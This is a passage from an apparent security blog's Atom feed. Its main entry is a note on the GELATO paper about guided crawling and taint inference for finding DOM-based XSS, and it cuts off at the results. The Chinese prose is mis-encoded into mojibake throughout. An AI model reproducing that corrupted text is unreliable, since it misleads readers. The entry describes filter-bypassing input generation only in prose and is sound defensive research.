href="http://zeroyu.xyz/2020/06/04/Code-breaking-Puzzles-2018-Note/#0x06-lumenserial" target="_blank" rel="noopener">Code-breaking Puzzles 2018 Noteâ€“lumenserial</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x00-å‰è¨€&quot;&gt;&lt;a href=&quot;#0x00-å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;0x00 å‰è¨€&quot;&gt;&lt;/a&gt;0x00 å‰è¨€&lt;/h3&gt;&lt;p&gt;å‰å¤©ç¬¬äº”ç©ºé—´çš„æ—¶å€™5am3é—®æˆ‘è¿˜ä¼šæLaravelä¸ã€‚åŠå¹´æ²¡æ‰“CTFäº†ï¼ŒçœŸçš„æ˜¯æ·¡å¿˜äº†å¾ˆå¤šï¼Œå†åŠ ä¸Šå½“æ—¶
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Gelato-&gt;Feedback-driven and Guided Security Analysis of Client-side Web Applications</title>
    <link href="http://zer0yu.github.io/2020/06/25/Gelato-Feedback-driven-and-Guided-Security-Analysis-of-Client-side-Web-Applications/"/>
    <id>http://zer0yu.github.io/2020/06/25/Gelato-Feedback-driven-and-Guided-Security-Analysis-of-Client-side-Web-Applications/</id>
    <published>2020-06-25T12:20:21.000Z</published>
    <updated>2020-06-25T12:21:51.301Z</updated>
    
    <content type="html"><![CDATA[<p>ç¬”è®°ä½œè€…ï¼šz3r0yu<br>è®ºæ–‡ä½œè€…ï¼šBehnaz Hassanshahi, Hyunjun Lee, Paddy Krishnan, JÃ¶rn GÃ¼y SuÃŸ<br>è®ºæ–‡é“¾æ¥ï¼š<a href="https://arxiv.org/abs/2004.06292" target="_blank" rel="noopener">https://arxiv.org/abs/2004.06292</a><br>è®ºæ–‡æ¥æºï¼š2020å¹´å‘è¡¨åœ¨é¢„å‘è¡¨å¹³å°arxivä¸Š</p><h3 id="0x01-ä¸»è¦å†…å®¹"><a href="#0x01-ä¸»è¦å†…å®¹" class="headerlink" title="0x01 ä¸»è¦å†…å®¹"></a>0x01 ä¸»è¦å†…å®¹</h3><ol><li>æ€»ç»“äº†å®‰å…¨æ„ŸçŸ¥çš„å®¢æˆ·ç«¯åˆ†æçˆ¬è™«åº”è¯¥æ”¯æŒçš„æœ€å…³é”®çš„åŠŸèƒ½(15ä¸ª)</li><li>GELATO:æ£€æµ‹å»ºç«‹åœ¨å¤æ‚åº“å’Œæ¡†æ¶ä¸Šçš„ç°ä»£å®¢æˆ·ç«¯JavaScriptåº”ç”¨çš„æ¼æ´(DOM XSSæ¼æ´)</li><li>åé¦ˆé©±åŠ¨çš„å®‰å…¨æ„ŸçŸ¥å¼•å¯¼çš„çˆ¬è™«æŠ€æœ¯</li><li>æ–°çš„è½»é‡çº§å®¢æˆ·ç«¯æ±¡ç‚¹åˆ†ææ–¹æ³•ï¼Œç›´æ¥å¯¹JSè¿›è¡Œæ’æ¡©ï¼Œæ— éœ€ä¿®æ”¹æµè§ˆå™¨å†…æ ¸ï¼Œå¯ä»¥å¯¹JavaScriptåº”ç”¨ç¨‹åºä¸Šçš„éå¹³å‡¡(non-trivial)æ±¡ç‚¹æµè¿›è¡ŒæŠ¥å‘Š</li><li>æ–°é¢–çš„åˆ†é˜¶æ®µæ±¡ç‚¹æ¨ç†åˆ†æï¼Œèƒ½å¤Ÿé«˜ç²¾åº¦åœ°æ£€æµ‹åŸºäºDOMçš„æ½œåœ¨XSSæ¼æ´</li></ol><h3 id="0x02-FEEDBACK-DRIVEN-GUIDED-AND-SECURITY-AWARE-CRAWLING-OF-MODERN-WEB-APPLICATIONS"><a href="#0x02-FEEDBACK-DRIVEN-GUIDED-AND-SECURITY-AWARE-CRAWLING-OF-MODERN-WEB-APPLICATIONS" class="headerlink" title="0x02 FEEDBACK-DRIVEN , GUIDED , AND SECURITY-AWARE CRAWLING OF MODERN WEB APPLICATIONS"></a>0x02 FEEDBACK-DRIVEN , GUIDED , AND SECURITY-AWARE CRAWLING OF MODERN WEB APPLICATIONS</h3><p>Gelato: åˆ©ç”¨åé¦ˆé©±åŠ¨çš„æ–¹æ³•ï¼Œæ ¹æ®ç›®æ ‡å®‰å…¨åˆ†æçš„è¦æ±‚ï¼Œè‡ªåŠ¨å¼•å¯¼çŠ¶æ€æ„ŸçŸ¥çˆ¬è™«ã€‚</p><p>ç®—æ³•çš„è¾“å…¥ï¼šä¸€ä¸ªç½‘ç»œåº”ç”¨çš„URLã€ä¸€ä¸ªç›®æ ‡å®‰å…¨åˆ†æTAå’Œä¸€ç»„çˆ¬è™«åº”è¯¥è¢«å¼•å¯¼çš„ç¨‹åºä½ç½®Loc<br>è¾“å‡ºï¼šç›®æ ‡åˆ†æçš„ç»“æœ (å¾ªç¯ä¸€ç›´æŒç»­åˆ°çˆ¬è™«åˆ°è¾¾ä¸€ä¸ªï¬xpointï¼Œå¹¶ä¸”æ²¡æœ‰æ›´å¤šçš„æ–°çŠ¶æ€å¯ä»¥è®¿é—®)</p><p>åœ¨æ¯æ¬¡è¿­ä»£æ—¶ï¼Œæˆ‘ä»¬å¯¹ç»™å®šçŠ¶æ€S(è¿™ä¸ªSæ˜¯é¡µé¢çš„çŠ¶æ€æ”¹å˜)ä¸­çš„JavaScriptå’ŒHTMLä»£ç è¿è¡Œç›®æ ‡å®‰å…¨åˆ†æTAï¼Œå¹¶æ”¶é›†ç»“æœã€‚</p><p>åŒæ—¶ï¼Œä½œè€…å¯¹æ–°å‘ç°çš„JavaScriptä»£ç è¿è¡Œè¿‘ä¼¼çš„è°ƒç”¨å›¾åˆ†æï¼Œå¹¶ä½¿ç”¨è½»é‡çº§å·¥å…·æ”¶é›†æ‰§è¡Œè·Ÿè¸ªã€‚æ‰§è¡Œè·Ÿè¸ªå¸®åŠ©æˆ‘ä»¬ç¡®å®šå®é™…çš„ï¼ˆçœŸé˜³æ€§ï¼‰å‡½æ•°è°ƒç”¨ï¼Œä»è€Œå»é™¤å‡é˜³æ€§è°ƒç”¨å›¾è¾¹ç¼˜ï¼Œå¹¶å°†æ–°å‘ç°çš„è°ƒç”¨å›¾æ·»åŠ åˆ°ACGä¸­ï¼ŒACGä¸­åŒ…å«äº†åº”ç”¨ç¨‹åºä¸­å·²æ¢ç´¢éƒ¨åˆ†çš„è°ƒç”¨å›¾ã€‚PrioritizeEvent(Sï¼ŒACG)æ ¹æ®ä½¿ç”¨ACGå’Œå½“å‰çŠ¶æ€Sæ¥å†³å®šä¸‹ä¸€æ­¥åº”è¯¥è§¦å‘å“ªä¸ªäº‹ä»¶ã€‚ </p><p><img src="https://i.loli.net/2020/06/25/Pibk5QWs2OzGnyI.png" alt="-w413"></p><h4 id="A-State-representation-and-comparison"><a href="#A-State-representation-and-comparison" class="headerlink" title="A. State representation and comparison"></a>A. State representation and comparison</h4><p>çŠ¶æ€æ„ŸçŸ¥çˆ¬è™«æœ€é‡è¦çš„å°±æ˜¯å¯¹çŠ¶æ€çš„è¡¨ç¤ºã€‚ç†æƒ³æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¸Œæœ›å­˜å‚¨æ•´ä¸ªæµè§ˆå™¨å’ŒæœåŠ¡å™¨çš„çŠ¶æ€ï¼Œä»¥ä¾¿èƒ½å¤Ÿåœ¨çŠ¶æ€ä¹‹é—´ä¼˜é›…åœ°æ¥å›åˆ‡æ¢ã€‚ç„¶è€Œï¼Œåœ¨æ¯ä¸ªçŠ¶æ€ä¸­ä¿å­˜å¦‚æ­¤åºå¤§çš„ä¿¡æ¯é‡æ˜¯ä¸ç°å®çš„ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªæŒ‘æˆ˜ï¼Œä½œè€…å°è¯•é€šè¿‡åªå­˜å‚¨çŠ¶æ€çš„å¤§å°æ¥ä¿æŒæœ€å°åŒ–ã€‚è¡¨ç¤ºçŠ¶æ€çš„å…³é”®å…ƒç´ æ˜¯(1)URLï¼›(2)DOMæ ‘ã€‚ä½œè€…è®°å½•äº†å¯¹çˆ¶çŠ¶æ€å’Œå­çŠ¶æ€çš„å¼•ç”¨ï¼Œä»¥ä¾¿èƒ½å¤Ÿé‡æ”¾ä¸ºè¾¾åˆ°å½“å‰çŠ¶æ€è€Œè§¦å‘çš„äº‹ä»¶åºåˆ—ã€‚</p><p>åˆ¤æ–­å½“å‰çŠ¶æ€æ˜¯å¦å·²ç»è®¿é—®è¿‡äº†çš„å¯å‘å¼æ–¹æ³•ï¼š<br>(1)URLçš„è·¯å¾„æ®µç›¸åŒï¼›<br>(2)DOMæ ‘çš„å¤§å°æ²¡æœ‰å‘ç”Ÿå·¨å¤§å˜åŒ–(å°äºé˜ˆå€¼)ï¼›<br>(3)DOMæ ‘çš„å“ˆå¸Œè®¡ç®—ç»“æœå®Œå…¨ç›¸åŒï¼Œæˆ–è€…DOMæ ‘ç»“æ„çš„å·®å¼‚å°äºé˜ˆå€¼ã€‚</p><h4 id="B-Search-strategy"><a href="#B-Search-strategy" class="headerlink" title="B. Search strategy"></a>B. Search strategy</h4><p>æ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰æ¥æ¢ç´¢çŠ¶æ€Sã€‚å›åˆ°å·²è®¿é—®çŠ¶æ€çš„ä¸€ç§æ–¹æ³•æ˜¯é‡æ”¾äº‹ä»¶åºåˆ—ï¼Œä»æ ¹éƒ¨ä¸€è·¯åˆ°è¾¾ç‰¹å®šçŠ¶æ€ã€‚è¿™ç§æ–¹æ³•éœ€è¦è§¦å‘è®¸å¤šä¸å¿…è¦çš„äº‹ä»¶ï¼Œè¿™ä¼šæå¤§åœ°å½±å“çˆ¬è™«çš„æ•ˆç‡ã€‚</p><p>ä¸€ç§å¯å‘å¼æ–¹æ³•å°†æµè§ˆå™¨å¸¦åˆ°ä¹‹å‰è®¿é—®è¿‡çš„çŠ¶æ€ï¼š<br>(1)æ£€æŸ¥æ˜¯å¦å¯ä»¥é€šè¿‡è§¦å‘å½“å‰çŠ¶æ€çš„å¦ä¸€ä¸ªäº‹ä»¶æ¥è¾¾åˆ°ç›®æ ‡çŠ¶æ€ï¼›<br>(2)è®¡ç®—çŠ¶æ€å›¾ä¸­è¾¾åˆ°ç›®æ ‡çŠ¶æ€çš„æœ€çŸ­è·¯å¾„ã€‚</p><h4 id="C-Call-graph-reï¬nement"><a href="#C-Call-graph-reï¬nement" class="headerlink" title="C. Call graph reï¬nement"></a>C. Call graph reï¬nement</h4><ol><li>cgæ˜¯é™æ€æ„æˆçš„(ä¹Ÿå°±æ˜¯ComputeACGå‡½æ•°)ï¼Œå®ƒå°±æ˜¯çŠ¶æ€Sä¸­æ‰§è¡Œçš„JavaScriptä»£ç ç”Ÿæˆä¸€ä¸ªè¿‘ä¼¼çš„è°ƒç”¨å›¾</li><li>åœ¨çˆ¬è™«ä¸ç”¨æˆ·ç•Œé¢çš„äº¤äº’è¿‡ç¨‹ä¸­ï¼Œæ”¶é›†å‡½æ•°è°ƒç”¨ä½œä¸ºæ‰§è¡Œè·Ÿè¸ªçš„ä¸€éƒ¨åˆ†ã€‚æ¥ä¸‹æ¥å¯¹è¿™ä¸ªæ‰§è¡Œè·Ÿè¸ªè¿›è¡Œå¤„ç†ï¼Œä»¥æ£€æŸ¥è°ƒç”¨å›¾ä¸­æ˜¯å¦æœ‰ä¸€æ¡è¾¹ç¼ºå¤±æˆ–ä¸ºå‡é˜³æ€§ã€‚è°ƒç”¨å›¾ä¼šæ ¹æ®è¿™äº›æ–°ä¿¡æ¯è¿›è¡Œæ›´æ–°ã€‚(ä¹Ÿå°±æ˜¯refineACGå‡½æ•°)</li></ol><h4 id="D-Prioritization"><a href="#D-Prioritization" class="headerlink" title="D. Prioritization"></a>D. Prioritization</h4><p>å¦‚æœå½“ä¸‹çš„çŠ¶æ€SåŒ…å«æˆ‘ä»¬éœ€è¦çš„Loc(ç›®æ ‡ä½ç½®)ï¼Œé‚£ä¹ˆå°±ä½¿ç”¨ACGå›¾ä¸­çš„æœ€çŸ­è·¯å¾„è¿›è¡Œè§¦å‘äº‹ä»¶åºåˆ—(å¼•å¯¼çˆ¬è™«åˆ°è¾¾ç›®æ ‡ä½ç½®)</p><h4 id="E-Input-value-generation"><a href="#E-Input-value-generation" class="headerlink" title="E. Input value generation"></a>E. Input value generation</h4><p>å‰ç«¯JavaScriptä¸€èˆ¬æ¥å—çš„è¾“å…¥å€¼ï¼šè¡¨å•ã€URLã€Cookieã€æœ¬åœ°å­˜å‚¨ç­‰ã€‚ä½†æ˜¯ä¸€èˆ¬å¯¹åº”çš„ä»£ç ä¼šæœ‰é˜²æŠ¤æªæ–½ï¼Œæ¯”å¦‚å¤„ç†æ‰ä¸€äº›ä¸å…è®¸çš„å­—ç¬¦ã€‚è¿™é‡Œè¦æ£€æµ‹çš„æ˜¯DOM XSSæ¼æ´ï¼Œé‚£ä¹ˆå®ƒå°±å¿…é¡»å¯¹å‰ç«¯çš„è¿‡æ»¤(è¿™é‡Œä¹Ÿä¸æ˜¯ä¸¥æ ¼çš„è¿‡æ»¤ï¼Œå…¶å®å°±æ˜¯é’ˆå¯¹å¤„ç†å­—ç¬¦çš„å‡½æ•°)è¿›è¡Œä¸€ä¸ªbypassã€‚ä½œè€…å°±ä½¿ç”¨å¯¹URLç±»å‹è¾“å…¥å€¼çš„ç”Ÿæˆä½œä¸ºä¾‹å­è®²è¿°æ­¤å¤„çš„åˆ†æç®—æ³•(è¿™ä¸ªç®—æ³•çš„è¾“å…¥æ˜¯å½“å‰çŠ¶æ€Så’Œç›®æ ‡åˆ†æTA)ã€‚</p><p>ä¸ºäº†bypassè·¯å¾„ä¸Šçš„guardsï¼š</p><ol><li>åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­æ”¶é›†æ„Ÿå…´è¶£çš„è¿è¡Œæ—¶å€¼ï¼Œæ„é€ è·¯å¾„çº¦æŸï¼Œå¹¶æ±‚è§£å®ƒä»¬ä»¥ç”Ÿæˆè¾“å…¥å€¼</li><li>è¿è¡Œæ—¶å€¼çš„ä¾‹å­æ˜¯æ¡ä»¶è¯­å¥ä¸­çš„æ“ä½œæ•°å’Œå­—ç¬¦ä¸²å‡½æ•°è°ƒç”¨ä¸­çš„å‚æ•°ï¼ˆä¾‹å¦‚ï¼Œstring.substringå†…ç½®å‡½æ•°ï¼‰ï¼Œå®ƒä»¬åœ¨æ‰§è¡Œè·¯å¾„ä¸Šè¢«è§¦å‘æ¥å¯¹æˆ‘ä»¬çš„è¾“å…¥åšæ ¡éªŒã€‚</li><li>è¿™äº›è¿è¡Œæ—¶æ”¶é›†çš„å€¼å°†ä¼šä½œä¸ºçº¦æŸï¼Œåœ¨åé¢çº¦æŸè¾“å…¥çš„ç”Ÿæˆã€‚</li></ol><h4 id="F-Support-for-other-features"><a href="#F-Support-for-other-features" class="headerlink" title="F. Support for other features"></a>F. Support for other features</h4><p><strong>åŠ¨æ€äº‹ä»¶å¤„ç†ç¨‹åºæ³¨å†Œ</strong>ã€‚æˆ‘ä»¬æ‰§è¡ŒåŠ¨æ€åˆ†ææ¥æ”¶é›†è¿è¡Œæ—¶çš„å€¼ã€ç—•è¿¹ï¼Œå¹¶æ•è·é™æ€éš¾ä»¥æ£€æµ‹çš„äº‹ä»¶ã€‚ä¸ºäº†æ‰§è¡ŒåŠ¨æ€åˆ†æï¼Œæˆ‘ä»¬å¯¹JavaScriptä»£ç è¿›è¡Œå·¥å…·åŒ–å¤„ç†ä»¥æ”¶é›†ç—•è¿¹ï¼Œå¹¶hookäº‹ä»¶å¤„ç†ç¨‹åºä»¥æ•è·é‚£äº›åœ¨è¿è¡Œæ—¶æ— æ³•å‘ç°çš„äº‹ä»¶ã€‚è¿˜æœ‰å¾ˆå¤šæƒ…å†µä¸‹ï¼Œäº‹ä»¶æ³¨å†Œæ˜¯åœ¨åº“ä¸­é€šè¿‡å¤æ‚çš„æœºåˆ¶å®Œæˆçš„ï¼Œå¹¶ä¸ç›´æ¥ï¼ˆä¾‹å¦‚jQueryä¸­çš„äº‹ä»¶å§”æ‰˜æœºåˆ¶ï¼‰ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä½¿ç”¨å¸¸è§çš„åº“å’Œæ¡†æ¶çš„æ¨¡å‹ï¼Œå…è®¸æˆ‘ä»¬ä»å…¶å†…éƒ¨æ•°æ®å­˜å‚¨ä¸­æå–æ‰€éœ€çš„ä¿¡æ¯ã€‚</p><p><strong>é™æ€é“¾æ¥æå–</strong>ã€‚ä¸å¤§å¤šæ•°ç°æœ‰çš„çˆ¬è™«ç±»ä¼¼ï¼Œæˆ‘ä»¬ä»HTMLé¡µé¢ä¸­é™æ€æå–é“¾æ¥ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬å°†é™æ€é“¾æ¥æå–ä¸çŠ¶æ€ä¼˜å…ˆçº§ç›¸ç»“åˆï¼Œå…·ä½“å¦‚ä¸‹ã€‚åœ¨çŠ¶æ€æ„ŸçŸ¥æŠ“å–å¼€å§‹ä¹‹å‰ï¼ŒGELATOä»URLå¼€å§‹é™æ€æå–HTMLé¡µé¢çš„é“¾æ¥ã€‚è¿™ä¸€æ­¥è®©æˆ‘ä»¬å¯ä»¥æ£€ç´¢åˆ°Webåº”ç”¨çš„éƒ¨åˆ†å’Œç²—ç²’åº¦ç»“æ„ã€‚æˆ‘ä»¬è¿˜ä¸ºæå–çš„é¡µé¢çš„JavaScriptä»£ç é™æ€åœ°å»ºç«‹è°ƒç”¨å›¾ï¼Œå¦‚æœå®ƒä»¬åŒ…å«ç”¨æˆ·æŒ‡å®šçš„ç›®æ ‡ä½ç½®ï¼ˆç®—æ³•1ä¸­çš„Locï¼‰ï¼Œåˆ™å°†å®ƒä»¬ä¼˜å…ˆç”¨äºçŠ¶æ€æ„ŸçŸ¥æŠ“å–</p><p><strong>è¡¨å•å¡«å†™</strong>ã€‚GELATOç”¨æä¾›çš„æœ‰æ•ˆè½½è·ä½œä¸ºconï¬gurationå¡«å……è¡¨å•ã€‚æ­¤å¤„å°±æ˜¯å°±ä½¿ç”¨äº†è¾“å…¥å€¼ç”ŸæˆæŠ€æœ¯ã€‚</p><h3 id="0x03-TARGET-SECURITY-ANALYSIS-DOM-BASED-XSS-DETECTION"><a href="#0x03-TARGET-SECURITY-ANALYSIS-DOM-BASED-XSS-DETECTION" class="headerlink" title="0x03 TARGET SECURITY ANALYSIS: DOM-BASED XSS DETECTION"></a>0x03 TARGET SECURITY ANALYSIS: DOM-BASED XSS DETECTION</h3><p>åŠ¨æ€æ±¡ç‚¹åˆ†ææ˜¯æ£€æµ‹åŠ¨æ€è¯­è¨€ç¼–å†™çš„åº”ç”¨ç¨‹åºä¸­æ³¨å…¥æ¼æ´çš„å¸¸ç”¨æŠ€æœ¯ã€‚ç„¶è€Œï¼Œåœ¨å®è·µä¸­ï¼Œå¿…é¡»è§£å†³å‡ ä¸ª<strong>æŠ€æœ¯æŒ‘æˆ˜</strong>ï¼Œä»¥å®ç°èƒ½å¤Ÿåˆ†æå®é™…åº”ç”¨çš„åŠ¨æ€æ±¡ç‚¹åˆ†æã€‚</p><ol><li><p>é€šè¿‡non-instrumentedä»£ç è·Ÿè¸ªæ±¡ç‚¹ã€‚å› ä¸ºJavaScriptå¼•æ“é€šå¸¸æ˜¯ç”¨ä½çº§è¯­è¨€ï¼ˆCï¼ŒC++ï¼‰å®ç°çš„ï¼Œæ‰€ä»¥åŸºäºå·¥å…·çš„åŠ¨æ€åˆ†æå°†æ— æ³•æ’æ¡©æ‰€æœ‰çš„å†…ç½®å‡½æ•°ï¼ˆä¾‹å¦‚ï¼Œæ•°ç»„ä¿®æ”¹å’Œå­—ç¬¦ä¸²æ“ä½œï¼‰ã€‚æ­¤å¤–ï¼Œå‡ºäºæ•ˆç‡çš„åŸå› ï¼Œé€šå¸¸æœ€å¥½ä¸è¦å¯¹æ•´ä¸ªåº”ç”¨ç¨‹åºè¿›è¡Œæ’æ¡©å¤„ç†ï¼Œéš¾å…ç•™ä¸‹ä¸€äº›æ¨¡å—ã€‚å› æ­¤ï¼Œåˆ†æéœ€è¦æ¨¡æ‹Ÿæœªæ’æ¡©ä»£ç ä¸­å‘ç”Ÿçš„æƒ…å†µï¼Œå¹¶ç›¸åº”åœ°æ›´æ–°æ±¡ç‚¹æ ‡ç­¾ã€‚å¤„ç†æœªæ’æ¡©ä»£ç çš„ä¸€ç§å¸¸è§æ–¹æ³•æ˜¯ä½¿ç”¨æ‰‹åŠ¨åˆ›å»ºçš„æ¨¡å‹ã€‚æ‰€ä»¥æ¨¡å‹å°±å†³å®šäº†åŠ¨æ€åˆ†æç»“æœçš„å¥½åã€‚ä½†æ˜¯ç°æœ‰ç ”ç©¶çš„æ¨¡å‹ä¸æ˜¯åŒ…å«é”™è¯¯å°±æ˜¯ä¸å®Œæ•´ã€‚</p></li><li><p>å°†æ±¡ç‚¹æ ‡ç­¾é™„åŠ åˆ°åŸå§‹å€¼ä¸Šã€‚åŸå§‹å€¼æ˜¯ä¸èƒ½ç”¨é™„åŠ å±æ€§è¿›è¡Œæ‰©å±•çš„ï¼Œæ‰€ä»¥å¸¸è§çš„æ–¹å¼å°±æ˜¯è®²åŸå§‹å€¼åŒ…è£…åœ¨ä¸€ä¸ªå¯¹è±¡ä¸­ï¼Œè¿™ä¸ªå¯¹è±¡ä¸Šæ ‡è¯†äº†è¯¥å¤„å€¼çš„æ±¡ç‚¹æ ‡ç­¾å±æ€§ã€‚ä½†æ˜¯è¿™æ˜¯ä¸€ä¸ªä¼šæ”¹å˜åŸå§‹ç¨‹åºæ‰§è¡Œçš„ä¾µå…¥æ€§è¿‡ç¨‹ï¼Œæ‰€ä»¥å¿…é¡»æ³¨æ„ä¸è¦æ”¹å˜å…¶è¯­ä¹‰ã€‚ä½†æ˜¯åœ¨ä¿ç•™åŸå§‹ç¨‹åºè¯­ä¹‰çš„åŒæ—¶å°è£…åŸå§‹å€¼æ˜¯æå…·æŒ‘æˆ˜æ€§çš„ã€‚å¯èƒ½æ˜¯å› ä¸ºè¿™äº›é—®é¢˜çš„å­˜åœ¨Jalangi2ä¸­å·²ç»ä¸é‡‡ç”¨å°è£…åŸå§‹å€¼çš„æ–¹å¼ã€‚</p></li></ol><p>æœ¬æ–‡çš„è§£å†³æ–¹æ¡ˆï¼šåŸºäºæºä»£ç æ’æ¡©ï¼›éä¾µå…¥å¼(ä¸æ”¹å˜è¯­ä¹‰)åŠ¨æ€æ±¡ç‚¹æ¨ç†</p><p>å…³é”®æ˜¯å…³è”sourceå’Œsinkçš„å€¼ï¼Œè§‚å¯Ÿç¨‹åºçš„è¡Œä¸ºè€Œä¸æ˜¯é™„åŠ å’Œè·Ÿè¸ªæ±¡ç‚¹æ ‡ç­¾æ¥æ¨æ–­æ±¡ç‚¹(å°±æ˜¯åˆ¤æ–­ç»è¿‡è¿‡æ»¤ä¹‹åå¯¹åº”ä½ç½®æ˜¯å¦è¿˜æ˜¯ä¸€ä¸ªæ±¡ç‚¹ï¼Œå› ä¸ºå¹¶ä¸æ˜¯å­˜åœ¨æ•æ„Ÿç‚¹çš„ä½ç½®å°±æ˜¯ä¸€ä¸ªæ±¡ç‚¹çš„ä½ç½®)ã€‚æœ¬æ–‡æå‡ºäº†ä¸€ä¸ªé˜¶æ®µæ€§çš„æ–¹æ³•ï¼Œä¸»è¦å¯ä»¥åˆ’åˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªé˜¶æ®µ(ä¸€ä¸ªè±å½¢å—å„¿æ˜¯ä¸€ä¸ªé˜¶æ®µ)ï¼š</p><p><img src="https://i.loli.net/2020/06/25/GvgJ3pQsRMjUkOa.png" alt="-w417"></p><h3 id="0x04-å®éªŒè¯„ä¼°"><a href="#0x04-å®éªŒè¯„ä¼°" class="headerlink" title="0x04 å®éªŒè¯„ä¼°"></a>0x04 å®éªŒè¯„ä¼°</h3><p>è¯„ä¼°æ˜¯é’ˆå¯¹å¦‚ä¸‹é—®é¢˜è¿›è¡ŒéªŒè¯ï¼š</p><ul><li>RQ1ï¼šGELATOçš„åé¦ˆé©±åŠ¨å’Œå¼•å¯¼çˆ¬è¡ŒæŠ€æœ¯åœ¨è¦†ç›–ç‡å’Œæ€§èƒ½æ–¹é¢çš„æ•ˆæœå¦‚ä½•ï¼Ÿ</li><li>RQ2ï¼šGELATOä¸å…¶ä»–å·¥å…·ç›¸æ¯”ï¼Œå‘ç°çš„URLæ•°é‡å¦‚ä½•ï¼Ÿ</li><li>RQ3: ä¸æœ€å…ˆè¿›çš„æ±¡ç‚¹åˆ†ææŠ€æœ¯ç›¸æ¯”ï¼ŒGELATOåŸºäºDOMçš„XSSæ£€æµ‹æŠ€æœ¯åœ¨ç²¾åº¦å’Œå¬å›æ–¹é¢çš„æ•ˆæœå¦‚ä½•ï¼Ÿ</li></ul><h4 id="A-Choosing-benchmarks"><a href="#A-Choosing-benchmarks" class="headerlink" title="A. Choosing benchmarks"></a>A. Choosing benchmarks</h4><p>ç¯‡æ–‡ç« çš„benchmarkçš„æ¥æºä¸ºï¼švulnerable open-source applications, vulnerable libraries, our in-house applications, and micro-benchmarks</p><h4 id="B-RQ1-effectiveness-of-our-feedback-driven-and-guided-crawling-technique"><a href="#B-RQ1-effectiveness-of-our-feedback-driven-and-guided-crawling-technique" class="headerlink" title="B. RQ1: effectiveness of our feedback-driven and guided crawling technique"></a>B. RQ1: effectiveness of our feedback-driven and guided crawling technique</h4><p>æµ‹é‡åº”ç”¨ç¨‹åºä¸ŠAJAXè°ƒç”¨(æ¯ä¸ªç­–ç•¥éšæ—¶é—´å˜åŒ–çš„ä¸åŒAJAXè°ƒç”¨æ¬¡æ•°)çš„æ€§èƒ½å’Œè¦†ç›–ç‡ï¼Œæ¥è¯„ä¼°æœ¬æ–‡çš„åé¦ˆé©±åŠ¨å’Œå¼•å¯¼å¼æŠ“å–æŠ€æœ¯çš„æœ‰æ•ˆæ€§ã€‚</p><p>ä¸‹å›¾æ˜¾ç¤ºäº†æœ¬æ–‡çš„å¼•å¯¼å¼çˆ¬è™«ç­–ç•¥ä¸éå¼•å¯¼å¼éšæœºçˆ¬è™«ç­–ç•¥çš„æ¯”è¾ƒã€‚è¯·æ³¨æ„ï¼Œéšæœºç­–ç•¥ä»ç„¶å¾—ç›Šäºæˆ‘ä»¬çš„åŠ¨æ€åˆ†ææŠ€æœ¯ï¼Œåªæ˜¯ç”¨éšæœºé€‰æ‹©ä»£æ›¿äº†ç®—æ³•1ä¸­çš„çŠ¶æ€å’Œäº‹ä»¶ä¼˜å…ˆçº§å‡½æ•°ã€‚</p><p>è¯„ä¼°äº†ä¸‰ä¸ªç‰ˆæœ¬çš„å¼•å¯¼å¼çˆ¬è¡ŒæŠ€æœ¯ï¼š<br>(1) ACG + Modelsï¼Œå½“è¿‘ä¼¼è°ƒç”¨å›¾æ— æ³•æœ‰æ•ˆåˆ†æåº“æ—¶ï¼Œä½¿ç”¨æ‰‹åŠ¨åˆ¶ä½œçš„æ¨¡å‹ï¼Œå¦‚jQueryï¼›<br>(2) ACG + EAï¼Œè¿™æ˜¯æˆ‘ä»¬çš„åé¦ˆé©±åŠ¨çš„è¾¹ç¼˜æ·»åŠ æŠ€æœ¯ï¼Œåœ¨è¿è¡Œæ—¶æ‰§è¡Œè¿‡ç¨‹ä¸­é‡æ–°å®šä¹‰é™æ€ç”Ÿæˆçš„è°ƒç”¨å›¾ï¼Œå¹¶æ·»åŠ æ–°å‘ç°çš„è¾¹ç¼˜ï¼›<br>(3) ACG + BOTHï¼ŒåŒæ—¶ä½¿ç”¨Modelså’ŒEAã€‚é€šè¿‡æ¯”è¾ƒè¿™ä¸‰ä¸ªç‰ˆæœ¬ï¼Œæˆ‘ä»¬è¯„ä¼°äº†æˆ‘ä»¬æ–°é¢–çš„ACGè¾¹ç¼˜æ·»åŠ æŠ€æœ¯çš„æœ‰æ•ˆæ€§ï¼Œè¯¥æŠ€æœ¯æ˜¯å®Œå…¨è‡ªåŠ¨çš„ï¼Œå¯ä»¥åœ¨æ‰‹å·¥åˆ¶ä½œçš„åº“æ¨¡å‹ä¸å¯ç”¨æ—¶ä½¿ç”¨ã€‚</p><p><img src="https://i.loli.net/2020/06/25/Qtl6HraowvVEX5s.png" alt="-w425"></p><p>ä»å®éªŒç»“æœå¯ä»¥çœ‹å‡º<strong>å¼•å¯¼å¼çˆ¬è¡Œç­–ç•¥</strong>æ¯”éšæœºç­–ç•¥åœ¨æ‰€æœ‰ä¸‰ä¸ªåº”ç”¨ä¸­æ›´å¿«åœ°æ‰¾åˆ°AJAXè°ƒç”¨ï¼Œè¿™ä¸‰ä¸ªåº”ç”¨éƒ½ä½¿ç”¨äº†ç°ä»£æŠ€æœ¯ï¼Œè€Œä¸”çˆ¬è¡Œçš„é€Ÿåº¦éåŒå°å¯ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬çš„åé¦ˆé©±åŠ¨è¾¹ç¼˜åŠ æ³•ï¼ˆACG EAï¼‰æŠ€æœ¯ä¹Ÿè¢«è¯æ˜æ˜¯æœ‰æ•ˆçš„ï¼šè¯¥æŠ€æœ¯å‘ç°çš„AJAXè°ƒç”¨æ•°é‡ä¸ç²¾å¿ƒæ„å»ºçš„äººå·¥æ¨¡å‹å¤„äºç›¸åŒçš„èŒƒå›´å†…ã€‚</p><h4 id="C-Results-for-DOM-based-XSS-detection"><a href="#C-Results-for-DOM-based-XSS-detection" class="headerlink" title="C. Results for DOM-based XSS detection"></a>C. Results for DOM-based XSS 